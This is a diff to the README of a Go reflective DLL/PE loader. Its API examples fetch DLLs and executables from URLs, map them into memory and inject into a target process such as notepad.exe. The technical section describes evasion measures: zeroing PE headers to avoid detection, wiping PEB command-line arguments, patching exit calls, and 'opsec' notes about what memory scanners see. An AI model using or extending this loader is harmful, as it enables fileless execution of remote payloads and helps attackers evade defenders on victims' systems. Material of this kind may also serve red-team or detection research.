@@ -23,14 +23,14 @@ also works with go compiled dlls, see go-dll-src/ for reference
 ## api usage
 
 ```go
-// load dll from file
-mapping, err := pe.LoadDLLFromFile("path/to/dll.dll", "ExportedFunction")
+// load dll from url with export specification
+mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "export_only:ExportedFunction")
 
-// load dll from url with optional sleep before encrypt/decrypt finishes
-mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction", 5)
+// load pe from url with optional sleep in seconds before execution
+peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 2)
 
-// load dll from url without sleep before encrypt/decrypt finishes
-mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction")
+// load pe from url without sleep
+peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 0)
 
 pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
 if err != nil {
@@ -68,16 +68,23 @@ log.Printf("[main] LoadPERemote succeeded")
 
 // check currently mapped dlls
 baseAddrs, sizes, count := pe.GetMap()
-fmt.Printf("currently have %d PEs mapped:\n", count)
+fmt.Printf("currently have %d DLLs mapped:\n", count)
 for i := 0; i < count; i++ {
-	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
+	fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
+}
+
+// check currently mapped pes
+peBaseAddrs, peSizes, peCount := pe.GetPEMap()
+fmt.Printf("currently have %d PEs mapped:\n", peCount)
+for i := 0; i < peCount; i++ {
+	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 }
 
 // cleanup/unmap dll from memory
 err = pe.Melt(mapping)
 
-// cleanup/ummap exe from memory 
-err = pe.MeltPE(mapping)
+// cleanup/unmap exe from memory 
+err = pe.MeltPE(peMapping)
 ```
 
 ## function identifier interface
@@ -92,17 +99,19 @@ if no specific function is found, the loader will execute the dll's entry point 
 
 ## technical implementation
 
-the loader performs standard reflective dll loading steps:
+the loader performs standard reflective dll/pe loading steps:
 
 pe validation checks dos and nt headers for proper signatures and offsets. memory allocation uses NtAllocateVirtualMemory attempting preferred base address first, falling back to system-chosen addresses. section mapping copies pe headers and each section to their virtual addresses using NtWriteVirtualMemory.
 
-relocation processing handles base address changes by parsing the relocation table and updating all absolute addresses. only IMAGE_REL_BASED_DIR64 relocations are processed for 64-bit compatibility. import resolution walks the import table, loads required libraries with LoadLibraryW, and resolves function addresses with GetProcAddress.
+relocation processing handles base address changes by parsing the relocation table and updating all absolute addresses. both IMAGE_REL_BASED_DIR64 and IMAGE_REL_BASED_HIGHLOW relocations are processed for compatibility. import resolution walks the import table, loads required libraries with LoadLibraryLdr, and resolves function addresses with hash-based lookups.
 
-memory protection changes from PAGE_READWRITE to PAGE_EXECUTE_READ using NtProtectVirtualMemory after dll loading completes. export resolution searches the export table by name or ordinal to find the target function.
+**exit function patching**: during iat resolution, any references to process termination functions (exit, ExitProcess, _exit, _Exit, quick_exit) are automatically replaced with ExitThread. this prevents loaded pes from terminating the entire loader process, ensuring they only exit their own thread.
 
-the encryption system generates a random 32-byte rc4 key during loading. a deferred function encrypts the mapped dll memory in place after execution completes. the encryption key gets securely wiped from memory after use.
+memory protection changes from PAGE_READWRITE to appropriate section protections (PAGE_EXECUTE_READ, PAGE_READWRITE, etc.) using NtProtectVirtualMemory after loading completes. export resolution searches the export table by name or ordinal to find the target function.
 
-memory tracking maintains a global registry of loaded dlls protected by read-write mutex. each mapping stores base address and size information. the Melt function uses VirtualFree with MEM_RELEASE flag and automatically removes entries from the tracking registry. this is opsec iffy, but DLL 0: Base=0x19065C10000, Size=32768 bytes is all that shows up to memory scanners, can also optionally be encrypted when unused if you want to adapt this further
+tls callbacks are executed with proper calling conventions before the entry point. pe headers are zeroed out after loading to avoid detection. command line arguments in the peb are wiped to prevent information leakage.
+
+memory tracking maintains separate global registries for loaded dlls and pes protected by read-write mutex. each mapping stores base address and size information. the Melt/MeltPE functions use NtFreeVirtualMemory with MEM_RELEASE flag and automatically removes entries from the tracking registry.
 
 ## evasion features
 
